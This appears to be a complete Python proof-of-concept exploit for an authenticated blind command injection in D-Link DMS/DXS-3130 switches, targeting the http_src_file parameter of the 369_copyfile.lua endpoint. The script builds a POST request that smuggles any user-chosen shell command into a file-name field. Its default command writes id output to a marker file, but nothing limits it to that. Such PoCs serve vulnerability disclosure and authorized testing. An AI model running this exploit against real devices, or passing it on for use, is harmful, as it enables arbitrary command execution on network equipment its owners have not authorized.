#!/usr/bin/env python3
"""D-Link DMS/DXS-3130 369_copyfile.lua authenticated command injection PoC."""

import argparse
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request

ENDPOINT = "/htdocs/lua/DataStore/369_copyfile.lua"
MARKER = "/tmp/dms_dxs3130_369_proof"
FIELDS = (
    ("hiddest_filetype", "1"),
    ("hiddest_unitid", "1"),
    ("hidfile_src_name", "x"),
    ("hidreplace_option", "0"),
    ("hiddest_optiontype", "0"),
)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def parse_args():
    parser = argparse.ArgumentParser(
        description="Authenticated blind OS command injection in 369_copyfile.lua (http_src_file)."
    )
    parser.add_argument("-t", "--target", required=True, help="Base URL, for example http://192.168.1.1")
    auth = parser.add_mutually_exclusive_group()
    auth.add_argument("-s", "--sid", help="Authenticated SID/SIDSSL value, with or without the cookie name")
    auth.add_argument("--no-cookie", action="store_true", help="No session cookie; only for an authorized test fixture")
    parser.add_argument("-c", "--command", default=f"id > {MARKER}", help=f"Command to execute (default: id > {MARKER})")
    parser.add_argument("--timeout", type=float, default=15, help="HTTP timeout in seconds (default: 15)")
    parser.add_argument("-k", "--insecure", action="store_true", help="Skip HTTPS certificate verification")
    return parser.parse_args()


def normalize_target(value):
    parsed = urllib.parse.urlsplit(value if "://" in value else "http://" + value)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError("Target must be a valid HTTP or HTTPS base URL")
    if parsed.username or parsed.password or parsed.query or parsed.fragment:
        raise ValueError("Target must not contain credentials, a query string, or a fragment")
    parsed.port
    return parsed.scheme, urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path.rstrip("/"), "", ""))


def cookie_header(args, scheme):
    if args.no_cookie:
        return None
    if not args.sid:
        raise ValueError("An authenticated session is required: provide --sid (or explicitly select --no-cookie for emulation)")
    value = args.sid.strip()
    if value.lower().startswith(("sid=", "sidssl=")):
        value = value.split("=", 1)[1]
    if not value or any(char in value for char in ";\r\n"):
        raise ValueError("Invalid session cookie value")
    return f"{'SIDSSL' if scheme == 'https' else 'SID'}={value}"


def main():
    args = parse_args()
    if not args.command.strip() or any(char in args.command for char in "\r\n\x00"):
        raise ValueError("Command must be non-empty and must not contain NUL or newline characters")
    scheme, base = normalize_target(args.target)
    url = base + ENDPOINT
    cookie = cookie_header(args, scheme)
    source = f"/tmp/nonexistent; {args.command}; #"
    fields = FIELDS + (("http_src_file", source),)
    headers = {
        "User-Agent": "Mozilla/5.0 (authorized-security-test)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close",
    }
    if cookie:
        headers["Cookie"] = cookie
    request = urllib.request.Request(url, data=urllib.parse.urlencode(fields).encode(), headers=headers, method="POST")
    context = ssl._create_unverified_context() if args.insecure and scheme == "https" else None
    opener = urllib.request.build_opener(NoRedirect(), urllib.request.HTTPSHandler(context=context)) if context else urllib.request.build_opener(NoRedirect())

    print(f"[*] Target: {url}")
    print("[*] Vulnerable parameter: http_src_file")
    print(f"[*] Injected source value: {source}")
    try:
        response = opener.open(request, timeout=args.timeout)
    except urllib.error.HTTPError as error:
        if error.code not in (301, 302, 303, 307, 308):
            body = error.read(8192).decode("utf-8", "replace")
            print(f"[!] HTTP {error.code}: request rejected\n{body}", file=sys.stderr)
            return 1
        response = error

    with response:
        status = response.status
        location = response.headers.get("Location", "")
        body = response.read(16384).decode("utf-8", "replace")
    print(f"[+] HTTP status: {status}")
    if location:
        print(f"[+] Location: {location}")
    if body:
        print(f"[+] Response body (truncated to 16 KiB):\n{body}")
    if "login" in location.lower() or "permission" in urllib.parse.unquote(location).lower():
        print("[!] The response indicates an authentication or authorization failure.", file=sys.stderr)
        return 2
    if status == 200 and not body.strip():
        print("[!] Empty HTTP 200: delivery cannot be confirmed; check the session and backend error log.", file=sys.stderr)
        return 2
    print("[*] The request reached the server; this blind injection is not proven by an HTTP redirect alone.")
    print(f"[*] On the authorized target, verify the marker with: cat {MARKER}" if args.command == f"id > {MARKER}" else "[*] Verify the command's observable effect on the authorized target.")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except (ValueError, urllib.error.URLError, TimeoutError) as error:
        print(f"[!] {error}", file=sys.stderr)
        sys.exit(1)
